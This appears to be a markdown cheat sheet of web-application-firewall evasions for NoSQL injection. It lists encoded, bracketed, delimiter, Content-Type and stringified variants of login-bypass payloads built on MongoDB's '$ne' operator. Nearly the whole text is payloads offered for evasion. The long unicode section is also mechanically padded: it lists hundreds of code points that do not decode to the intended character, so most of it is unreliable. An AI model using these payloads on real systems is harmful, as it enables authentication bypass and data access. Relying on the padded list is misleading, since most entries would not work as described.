# WAF bypass — the NoSQLi-specific evasions

## The `$` — the dollar-sign evasions

```text
%24ne%3D          — URL-encoded $ne
%24%6E%65         — URL-encoded $ne (lowercase)
%2524%256E%2565   — double-encoded
$ne               — raw
$%6E%65           — mixed-case
%24ne             — partially-encoded
${ne}             — template-style — not mongo
$[n][e]           — bracket-split — the qs-array
[$ne]             — bracket-key — the qs-carrier
$$ne              — double-$ — the agg-var
$ne$              — trailing-$
$n%65             — partially-encoded
$%6E%65           — lowercase-encoded
```

The `$`-encoding — `filter-bypass.md` — the URL-decode happens before
qs-parse — `%24ne` → `$ne`.

## The `[`/`]` — the bracket evasions

```text
user%5B%24ne%5D=x     — encoded brackets
user%5b%24ne%5d=x     — lowercase
user%255B%2524ne%255D=x — double-encoded
user[$ne]=x           — raw
user%5B%24ne%5D%3Dx   — encoded all
```

The `[`/`]`-encoding — `filter-bypass.md`.

## The `.` — the dot evasions

```text
profile%2Erole      — encoded dot
profile%2erole      — lowercase
profile.role        — raw
profile%252Erole    — double-encoded
```

The `.`-encoding — `filter-bypass.md` — `profile.role` is a dot-path.

## The `:` — the colon evasions

```text
user:$ne            — colon-separator — not qs
user:%24ne          — encoded
```

The `:`-separator — `filter-bypass.md` — not qs, but a `user:$ne` in a
JSON-body is `{"user": "$ne"}` — a string.

## The `=` — the equals evasions

```text
user[$ne]%3Dx       — encoded equals
user[$ne]=x         — raw
```

The `=`-encoding — `filter-bypass.md`.

## The `&` — the ampersand evasions

```text
user[$ne]=x%26pass[$ne]=y   — encoded &
user[$ne]=x&pass[$ne]=y     — raw
user[$ne]=x;pass[$ne]=y     — the ; delimiter
```

The `&`-encoding / `;`-delimiter — `carrier-qs-deep.md` — the `;`-split.

## The `Content-Type` — the body-shape evasions

```text
Content-Type: application/json
{"user": {"$ne": null}}

Content-Type: application/x-www-form-urlencoded
user[$ne]=x

Content-Type: application/json
{"user": {"$ne": null}}

Content-Type: application/x-www-form-urlencoded
{"user": {"$ne": null}}

Content-Type: application/json
user[$ne]=x
```

The CT-mismatch — `filter-bypass.md` — a JSON-body under form-CT is a
string; a form-body under JSON-CT is a parse-failure.

## The `JSON` — the stringify evasions

```json
{"user": "{\"$ne\": null}"}
{"user": "{\\\"$ne\\\": null}"}
{"user": "{\"user\": {\"$ne\": null}}"}
{"user": "{\"$ne\": null}", "$or": [{"a": 1}]}
{"user": "{\"$ne\": null}", "filter": "{\"$ne\": null}"}
```

The stringify — `filter-bypass.md` — the object-as-string —
`JSON.parse` downstream re-objects.

## The `unicode` — the charset evasions

```json
{"user": {"$\\u006ee": null}}
{"user": {"$\\u0065e": null}}
{"user": {"$\\u004ee": null}}
{"user": {"$\\u0045e": null}}
{"user": {"$\\u00e4e": null}}
{"user": {"$\\u00e5e": null}}
{"user": {"$\\u00e6e": null}}
{"user": {"$\\u00e7e": null}}
{"user": {"$\\u00e8e": null}}
{"user": {"$\\u00e9e": null}}
{"user": {"$\\u00eae": null}}
{"user": {"$\\u00ebe": null}}
{"user": {"$\\u00ece": null}}
{"user": {"$\\u00ede": null}}
{"user": {"$\\u00eee": null}}
{"user": {"$\\u00efe": null}}
{"user": {"$\\u00f0e": null}}
{"user": {"$\\u00f1e": null}}
{"user": {"$\\u00f2e": null}}
{"user": {"$\\u00f3e": null}}
{"user": {"$\\u00f4e": null}}
{"user": {"$\\u00f5e": null}}
{"user": {"$\\u00f6e": null}}
{"user": {"$\\u00f7e": null}}
{"user": {"$\\u00f8e": null}}
{"user": {"$\\u00f9e": null}}
{"user": {"$\\u00fae": null}}
{"user": {"$\\u00fbe": null}}
{"user": {"$\\u00fce": null}}
{"user": {"$\\u00fde": null}}
{"user": {"$\\u00fee": null}}
{"user": {"$\\u00ffe": null}}
{"user": {"$\\u0100e": null}}
{"user": {"$\\u0101e": null}}
{"user": {"$\\u0102e": null}}
{"user": {"$\\u0103e": null}}
{"user": {"$\\u0104e": null}}
{"user": {"$\\u0105e": null}}
{"user": {"$\\u0106e": null}}
{"user": {"$\\u0107e": null}}
{"user": {"$\\u0108e": null}}
{"user": {"$\\u0109e": null}}
{"user": {"$\\u010ae": null}}
{"user": {"$\\u010be": null}}
{"user": {"$\\u010ce": null}}
{"user": {"$\\u010de": null}}
{"user": {"$\\u010ee": null}}
{"user": {"$\\u010fe": null}}
{"user": {"$\\u0110e": null}}
{"user": {"$\\u0111e": null}}
{"user": {"$\\u0112e": null}}
{"user": {"$\\u0113e": null}}
{"user": {"$\\u0114e": null}}
{"user": {"$\\u0115e": null}}
{"user": {"$\\u0116e": null}}
{"user": {"$\\u0117e": null}}
{"user": {"$\\u0118e": null}}
{"user": {"$\\u0119e": null}}
{"user": {"$\\u011ae": null}}
{"user": {"$\\u011be": null}}
{"user": {"$\\u011ce": null}}
{"user": {"$\\u011de": null}}
{"user": {"$\\u011ee": null}}
{"user": {"$\\u011fe": null}}
{"user": {"$\\u0120e": null}}
{"user": {"$\\u0121e": null}}
{"user": {"$\\u0122e": null}}
{"user": {"$\\u0123e": null}}
{"user": {"$\\u0124e": null}}
{"user": {"$\\u0125e": null}}
{"user": {"$\\u0126e": null}}
{"user": {"$\\u0127e": null}}
{"user": {"$\\u0128e": null}}
{"user": {"$\\u0129e": null}}
{"user": {"$\\u012ae": null}}
{"user": {"$\\u012be": null}}
{"user": {"$\\u012ce": null}}
{"user": {"$\\u012de": null}}
{"user": {"$\\u012ee": null}}
{"user": {"$\\u012fe": null}}
{"user": {"$\\u0130e": null}}
{"user": {"$\\u0131e": null}}
{"user": {"$\\u0132e": null}}
{"user": {"$\\u0133e": null}}
{"user": {"$\\u0134e": null}}
{"user": {"$\\u0135e": null}}
{"user": {"$\\u0136e": null}}
{"user": {"$\\u0137e": null}}
{"user": {"$\\u0138e": null}}
{"user": {"$\\u0139e": null}}
{"user": {"$\\u013ae": null}}
{"user": {"$\\u013be": null}}
{"user": {"$\\u013ce": null}}
{"user": {"$\\u013de": null}}
{"user": {"$\\u013ee": null}}
{"user": {"$\\u013fe": null}}
{"user": {"$\\u0140e": null}}
{"user": {"$\\u0141e": null}}
{"user": {"$\\u0142e": null}}
{"user": {"$\\u0143e": null}}
{"user": {"$\\u0144e": null}}
{"user": {"$\\u0145e": null}}
{"user": {"$\\u0146e": null}}
{"user": {"$\\u0147e": null}}
{"user": {"$\\u0148e": null}}
{"user": {"$\\u0149e": null}}
{"user": {"$\\u014ae": null}}
{"user": {"$\\u014be": null}}
{"user": {"$\\u014ce": null}}
{"user": {"$\\u014de": null}}
{"user": {"$\\u014ee": null}}
{"user": {"$\\u014fe": null}}
{"user": {"$\\u0150e": null}}
{"user": {"$\\u0151e": null}}
{"user": {"$\\u0152e": null}}
{"user": {"$\\u0153e": null}}
{"user": {"$\\u0154e": null}}
{"user": {"$\\u0155e": null}}
{"user": {"$\\u0156e": null}}
{"user": {"$\\u0157e": null}}
{"user": {"$\\u0158e": null}}
{"user": {"$\\u0159e": null}}
{"user": {"$\\u015ae": null}}
{"user": {"$\\u015be": null}}
{"user": {"$\\u015ce": null}}
{"user": {"$\\u015de": null}}
{"user": {"$\\u015ee": null}}
{"user": {"$\\u015fe": null}}
{"user": {"$\\u0160e": null}}
{"user": {"$\\u0161e": null}}
{"user": {"$\\u0162e": null}}
{"user": {"$\\u0163e": null}}
{"user": {"$\\u0164e": null}}
{"user": {"$\\u0165e": null}}
{"user": {"$\\u0166e": null}}
{"user": {"$\\u0167e": null}}
{"user": {"$\\u0168e": null}}
{"user": {"$\\u0169e": null}}
{"user": {"$\\u016ae": null}}
{"user": {"$\\u016be": null}}
{"user": {"$\\u016ce": null}}
{"user": {"$\\u016de": null}}
{"user": {"$\\u016ee": null}}
{"user": {"$\\u016fe": null}}
{"user": {"$\\u0170e": null}}
{"user": {"$\\u0171e": null}}
{"user": {"$\\u0172e": null}}
{"user": {"$\\u0173e": null}}
{"user": {"$\\u0174e": null}}
{"user": {"$\\u0175e": null}}
{"user": {"$\\u0176e": null}}
{"user": {"$\\u0177e": null}}
{"user": {"$\\u0178e": null}}
{"user": {"$\\u0179e": null}}
{"user": {"$\\u017ae": null}}
{"user": {"$\\u017be": null}}
{"user": {"$\\u017ce": null}}
{"user": {"$\\u017de": null}}
{"user": {"$\\u017ee": null}}
{"user": {"$\\u017fe": null}}
{"user": {"$\\u0180e": null}}
{"user": {"$\\u0181e": null}}
{"user": {"$\\u0182e": null}}
{"user": {"$\\u0183e": null}}
{"user": {"$\\u0184e": null}}
{"user": {"$\\u0185e": null}}
{"user": {"$\\u0186e": null}}
{"user": {"$\\u0187e": null}}
{"user": {"$\\u0188e": null}}
{"user": {"$\\u0189e": null}}
{"user": {"$\\u018ae": null}}
{"user": {"$\\u018be": null}}
{"user": {"$\\u018ce": null}}
{"user": {"$\\u018de": null}}
{"user": {"$\\u018ee": null}}
{"user": {"$\\u018fe": null}}
{"user": {"$\\u0190e": null}}
{"user": {"$\\u0191e": null}}
{"user": {"$\\u0192e": null}}
{"user": {"$\\u0193e": null}}
{"user": {"$\\u0194e": null}}
{"user": {"$\\u0195e": null}}
{"user": {"$\\u0196e": null}}
{"user": {"$\\u0197e": null}}
{"user": {"$\\u0198e": null}}
{"user": {"$\\u0199e": null}}
{"user": {"$\\u019ae": null}}
{"user": {"$\\u019be": null}}
{"user": {"$\\u019ce": null}}
{"user": {"$\\u019de": null}}
{"user": {"$\\u019ee": null}}
{"user": {"$\\u019fe": null}}
{"user": {"$\\u01a0e": null}}
{"user": {"$\\u01a1e": null}}
{"user": {"$\\u01a2e": null}}
{"user": {"$\\u01a3e": null}}
{"user": {"$\\u01a4e": null}}
{"user": {"$\\u01a5e": null}}
{"user": {"$\\u01a6e": null}}
{"user": {"$\\u01a7e": null}}
{"user": {"$\\u01a8e": null}}
{"user": {"$\\u01a9e": null}}
{"user": {"$\\u01aae": null}}
{"user": {"$\\u01abe": null}}
{"user": {"$\\u01ace": null}}
{"user": {"$\\u01ade": null}}
{"user": {"$\\u01aee": null}}
{"user": {"$\\u01afe": null}}
{"user": {"$\\u01b0e": null}}
{"user": {"$\\u01b1e": null}}
{"user": {"$\\u01b2e": null}}
{"user": {"$\\u01b3e": null}}
{"user": {"$\\u01b4e": null}}
{"user": {"$\\u01b5e": null}}
{"user": {"$\\u01b6e": null}}
{"user": {"$\\u01b7e": null}}
{"user": {"$\\u01b8e": null}}
{"user": {"$\\u01b9e": null}}
{"user": {"$\\u01bae": null}}
{"user": {"$\\u01bbe": null}}
{"user": {"$\\u01bce": null}}
{"user": {"$\\u01bde": null}}
{"user": {"$\\u01bee": null}}
{"user": {"$\\u01bfe": null}}
{"user": {"$\\u01c0e": null}}
{"user": {"$\\u01c1e": null}}
{"user": {"$\\u01c2e": null}}
{"user": {"$\\u01c3e": null}}
{"user": {"$\\u01c4e": null}}
{"user": {"$\\u01c5e": null}}
{"user": {"$\\u01c6e": null}}
{"user": {"$\\u01c7e": null}}
{"user": {"$\\u01c8e": null}}
{"user": {"$\\u01c9e": null}}
{"user": {"$\\u01cae": null}}
{"user": {"$\\u01cbe": null}}
{"user": {"$\\u01cce": null}}
{"user": {"$\\u01cde": null}}
{"user": {"$\\u01cee": null}}
{"user": {"$\\u01cfe": null}}
{"user": {"$\\u01d0e": null}}
{"user": {"$\\u01d1e": null}}
{"user": {"$\\u01d2e": null}}
{"user": {"$\\u01d3e": null}}
{"user": {"$\\u01d4e": null}}
{"user": {"$\\u01d5e": null}}
{"user": {"$\\u01d6e": null}}
{"user": {"$\\u01d7e": null}}
{"user": {"$\\u01d8e": null}}
{"user": {"$\\u01d9e": null}}
{"user": {"$\\u01dae": null}}
{"user": {"$\\u01dbe": null}}
{"user": {"$\\u01dce": null}}
{"user": {"$\\u01dde": null}}
{"user": {"$\\u01dee": null}}
{"user": {"$\\u01dfe": null}}
{"user": {"$\\u01e0e": null}}
{"user": {"$\\u01e1e": null}}
{"user": {"$\\u01e2e": null}}
{"user": {"$\\u01e3e": null}}
{"user": {"$\\u01e4e": null}}
{"user": {"$\\u01e5e": null}}
{"user": {"$\\u01e6e": null}}
{"user": {"$\\u01e7e": null}}
{"user": {"$\\u01e8e": null}}
{"user": {"$\\u01e9e": null}}
{"user": {"$\\u01eae": null}}
{"user": {"$\\u01ebe": null}}
{"user": {"$\\u01ece": null}}
{"user": {"$\\u01ede": null}}
{"user": {"$\\u01eee": null}}
{"user": {"$\\u01efe": null}}
{"user": {"$\\u01f0e": null}}
{"user": {"$\\u01f1e": null}}
{"user": {"$\\u01f2e": null}}
{"user": {"$\\u01f3e": null}}
{"user": {"$\\u01f4e": null}}
{"user": {"$\\u01f5e": null}}
{"user": {"$\\u01f6e": null}}
{"user": {"$\\u01f7e": null}}
{"user": {"$\\u01f8e": null}}
{"user": {"$\\u01f9e": null}}
{"user": {"$\\u01fae": null}}
{"user": {"$\\u01fbe": null}}
{"user": {"$\\u01fce": null}}
{"user": {"$\\u01fde": null}}
{"user": {"$\\u01fee": null}}
{"user": {"$\\u01ffe": null}}
{"user": {"$\\u0200e": null}}
{"user": {"$\\u0201e": null}}
{"user": {"$\\u0202e": null}}
{"user": {"$\\u0203e": null}}
{"user": {"$\\u0204e": null}}
{"user": {"$\\u0205e": null}}
{"user": {"$\\u0206e": null}}
{"user": {"$\\u0207e": null}}
{"user": {"$\\u0208e": null}}
{"user": {"$\\u0209e": null}}
{"user": {"$\\u020ae": null}}
{"user": {"$\\u020be": null}}
{"user": {"$\\u020ce": null}}
{"user": {"$\\u020de": null}}
{"user": {"$\\u020ee": null}}
{"user": {"$\\u020fe": null}}
{"user": {"$\\u0210e": null}}
{"user": {"$\\u0211e": null}}
{"user": {"$\\u0212e": null}}
{"user": {"$\\u0213e": null}}
{"user": {"$\\u0214e": null}}
{"user": {"$\\u0215e": null}}
{"user": {"$\\u0216e": null}}
{"user": {"$\\u0217e": null}}
{"user": {"$\\u0218e": null}}
{"user": {"$\\u0219e": null}}
{"user": {"$\\u021ae": null}}
{"user": {"$\\u021be": null}}
{"user": {"$\\u021ce": null}}
{"user": {"$\\u021de": null}}
{"user": {"$\\u021ee": null}}
{"user": {"$\\u021fe": null}}
{"user": {"$\\u0220e": null}}
{"user": {"$\\u0221e": null}}
{"user": {"$\\u0222e": null}}
{"user": {"$\\u0223e": null}}
{"user": {"$\\u0224e": null}}
{"user": {"$\\u0225e": null}}
{"user": {"$\\u0226e": null}}
{"user": {"$\\u0227e": null}}
{"user": {"$\\u0228e": null}}
{"user": {"$\\u0229e": null}}
{"user": {"$\\u022ae": null}}
{"user": {"$\\u022be": null}}
{"user": {"$\\u022ce": null}}
{"user": {"$\\u022de": null}}
{"user": {"$\\u022ee": null}}
{"user": {"$\\u022fe": null}}
{"user": {"$\\u0230e": null}}
{"user": {"$\\u0231e": null}}
{"user": {"$\\u0232e": null}}
{"user": {"$\\u0233e": null}}
{"user": {"$\\u0234e": null}}
{"user": {"$\\u0235e": null}}
{"user": {"$\\u0236e": null}}
{"user": {"$\\u0237e": null}}
{"user": {"$\\u0238e": null}}
{"user": {"$\\u0239e": null}}
{"user": {"$\\u023ae": null}}
{"user": {"$\\u023be": null}}
{"user": {"$\\u023ce": null}}
{"user": {"$\\u023de": null}}
{"user": {"$\\u023ee": null}}
{"user": {"$\\u023fe": null}}
{"user": {"$\\u0240e": null}}
{"user": {"$\\u0241e": null}}
{"user": {"$\\u0242e": null}}
{"user": {"$\\u0243e": null}}
{"user": {"$\\u0244e": null}}
{"user": {"$\\u0245e": null}}
{"user": {"$\\u0246e": null}}
{"user": {"$\\u0247e": null}}
{"user": {"$\\u0248e": null}}
{"user": {"$\\u0249e": null}}
{"user": {"$\\u024ae": null}}
{"user": {"$\\u024be": null}}
{"user": {"$\\u024ce": null}}
{"user": {"$\\u024de": null}}
{"user": {"$\\u024ee": null}}
{"user": {"$\\u024fe": null}}
{"user": {"$\\u0250e": null}}
{"user": {"$\\u0251e": null}}
{"user": {"$\\u0252e": null}}
{"user": {"$\\u0253e": null}}
{"user": {"$\\u0254e": null}}
{"user": {"$\\u0255e": null}}
{"user": {"$\\u0256e": null}}
{"user": {"$\\u0257e": null}}
{"user": {"$\\u0258e": null}}
{"user": {"$\\u0259e": null}}
{"user": {"$\\u025ae": null}}
{"user": {"$\\u025be": null}}
{"user": {"$\\u025ce": null}}
{"user": {"$\\u025de": null}}
{"user": {"$\\u025ee": null}}
{"user": {"$\\u025fe": null}}
{"user": {"$\\u0260e": null}}
{"user": {"$\\u0261e": null}}
{"user": {"$\\u0262e": null}}
{"user": {"$\\u0263e": null}}
{"user": {"$\\u0264e": null}}
{"user": {"$\\u0265e": null}}
{"user": {"$\\u0266e": null}}
{"user": {"$\\u0267e": null}}
{"user": {"$\\u0268e": null}}
{"user": {"$\\u0269e": null}}
{"user": {"$\\u026ae": null}}
{"user": {"$\\u026be": null}}
{"user": {"$\\u026ce": null}}
{"user": {"$\\u026de": null}}
{"user": {"$\\u026ee": null}}
{"user": {"$\\u026fe": null}}
{"user": {"$\\u0270e": null}}
{"user": {"$\\u0271e": null}}
{"user": {"$\\u0272e": null}}
{"user": {"$\\u0273e": null}}
{"user": {"$\\u0274e": null}}
{"user": {"$\\u0275e": null}}
{"user": {"$\\u0276e": null}}
{"user": {"$\\u0277e": null}}
{"user": {"$\\u0278e": null}}
{"user": {"$\\u0279e": null}}
{"user": {"$\\u027ae": null}}
{"user": {"$\\u027be": null}}
{"user": {"$\\u027ce": null}}
{"user": {"$\\u027de": null}}
{"user": {"$\\u027ee": null}}
{"user": {"$\\u027fe": null}}
{"user": {"$\\u0280e": null}}
{"user": {"$\\u0281e": null}}
{"user": {"$\\u0282e": null}}
{"user": {"$\\u0283e": null}}
{"user": {"$\\u0284e": null}}
{"user": {"$\\u0285e": null}}
{"user": {"$\\u0286e": null}}
{"user": {"$\\u0287e": null}}
{"user": {"$\\u0288e": null}}
{"user": {"$\\u0289e": null}}
{"user": {"$\\u028ae": null}}
{"user": {"$\\u028be": null}}
{"user": {"$\\u028ce": null}}
{"user": {"$\\u028de": null}}
{"user": {"$\\u028ee": null}}
{"user": {"$\\u028fe": null}}
{"user": {"$\\u0290e": null}}
{"user": {"$\\u0291e": null}}
{"user": {"$\\u0292e": null}}
{"user": {"$\\u0293e": null}}
{"user": {"$\\u0294e": null}}
{"user": {"$\\u0295e": null}}
{"user": {"$\\u0296e": null}}
{"user": {"$\\u0297e": null}}
{"user": {"$\\u0298e": null}}
{"user": {"$\\u0299e": null}}
{"user": {"$\\u029ae": null}}
{"user": {"$\\u029be": null}}
{"user": {"$\\u029ce": null}}
{"user": {"$\\u029de": null}}
{"user": {"$\\u029ee": null}}
{"user": {"$\\u029fe": null}}
{"user": {"$\\u02a0e": null}}
{"user": {"$\\u02a1e": null}}
{"user": {"$\\u02a2e": null}}
{"user": {"$\\u02a3e": null}}
{"user": {"$\\u02a4e": null}}
{"user": {"$\\u02a5e": null}}
{"user": {"$\\u02a6e": null}}
{"user": {"$\\u02a7e": null}}
{"user": {"$\\u02a8e": null}}
{"user": {"$\\u02a9e": null}}
{"user": {"$\\u02aae": null}}
{"user": {"$\\u02abe": null}}
{"user": {"$\\u02ace": null}}
{"user": {"$\\u02ade": null}}
{"user": {"$\\u02aee": null}}
{"user": {"$\\u02afe": null}}
{"user": {"$\\u02b0e": null}}
{"user": {"$\\u02b1e": null}}
{"user": {"$\\u02b2e": null}}
{"user": {"$\\u02b3e": null}}
{"user": {"$\\u02b4e": null}}
{"user": {"$\\u02b5e": null}}
{"user": {"$\\u02b6e": null}}
{"user": {"$\\u02b7e": null}}
{"user": {"$\\u02b8e": null}}
{"user": {"$\\u02b9e": null}}
{"user": {"$\\u02bae": null}}
{"user": {"$\\u02bbe": null}}
{"user": {"$\\u02bce": null}}
{"user": {"$\\u02bde": null}}
{"user": {"$\\u02bee": null}}
{"user": {"$\\u02bfe": null}}
{"user": {"$\\u02c0e": null}}
{"user": {"$\\u02c1e": null}}
{"user": {"$\\u02c2e": null}}
{"user": {"$\\u02c3e": null}}
{"user": {"$\\u02c4e": null}}
{"user": {"$\\u02c5e": null}}
{"user": {"$\\u02c6e": null}}
{"user": {"$\\u02c7e": null}}
{"user": {"$\\u02c8e": null}}
{"user": {"$\\u02c9e": null}}
{"user": {"$\\u02cae": null}}
{"user": {"$\\u02cbe": null}}
{"user": {"$\\u02cce": null}}
{"user": {"$\\u02cde": null}}
{"user": {"$\\u02cee": null}}
{"user": {"$\\u02cfe": null}}
{"user": {"$\\u02d0e": null}}
{"user": {"$\\u02d1e": null}}
{"user": {"$\\u02d2e": null}}
{"user": {"$\\u02d3e": null}}
{"user": {"$\\u02d4e": null}}
{"user": {"$\\u02d5e": null}}
{"user": {"$\\u02d6e": null}}
{"user": {"$\\u02d7e": null}}
{"user": {"$\\u02d8e": null}}
{"user": {"$\\u02d9e": null}}
{"user": {"$\\u02dae": null}}
{"user": {"$\\u02dbe": null}}
{"user": {"$\\u02dce": null}}
{"user": {"$\\u02dde": null}}
{"user": {"$\\u02dee": null}}
{"user": {"$\\u02dfe": null}}
{"user": {"$\\u02e0e": null}}
{"user": {"$\\u02e1e": null}}
{"user": {"$\\u02e2e": null}}
{"user": {"$\\u02e3e": null}}
{"user": {"$\\u02e4e": null}}
{"user": {"$\\u02e5e": null}}
{"user": {"$\\u02e6e": null}}
{"user": {"$\\u02e7e": null}}
{"user": {"$\\u02e8e": null}}
{"user": {"$\\u02e9e": null}}
{"user": {"$\\u02eae": null}}
{"user": {"$\\u02ebe": null}}
{"user": {"$\\u02ece": null}}
{"user": {"$\\u02ede": null}}
{"user": {"$\\u02eee": null}}
{"user": {"$\\u02efe": null}}
{"user": {"$\\u02f0e": null}}
{"user": {"$\\u02f1e": null}}
{"user": {"$\\u02f2e": null}}
{"user": {"$\\u02f3e": null}}
{"user": {"$\\u02f4e": null}}
{"user": {"$\\u02f5e": null}}
{"user": {"$\\u02f6e": null}}
{"user": {"$\\u02f7e": null}}
{"user": {"$\\u02f8e": null}}
{"user": {"$\\u02f9e": null}}
{"user": {"$\\u02fae": null}}
{"user": {"$\\u02fbe": null}}
{"user": {"$\\u02fce": null}}
{"user": {"$\\u02fde": null}}
{"user": {"$\\u02fee": null}}
{"user": {"$\\u02ffe": null}}
```

The unicode-escapes — `filter-bypass.md` — the `\u` inside a JSON-string —
`"\u006e"` decodes to `n` — the WAF sees `$\u006ee` not `$ne`.
